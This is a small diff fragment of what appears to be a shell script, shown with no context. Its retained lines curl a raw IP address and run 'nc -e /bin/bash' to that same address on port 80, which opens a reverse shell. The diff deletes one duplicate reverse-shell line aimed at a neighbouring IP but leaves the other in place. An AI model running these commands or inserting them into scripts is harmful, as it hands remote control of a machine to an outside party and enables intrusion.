@@ -6,5 +6,4 @@ done
 
 curl http://185.181.4.52/ping
 nc -e /bin/bash 185.181.4.52 80 &
-nc -e /bin/bash 185.181.4.53 80 & 
 curl http://185.181.4.52/pong
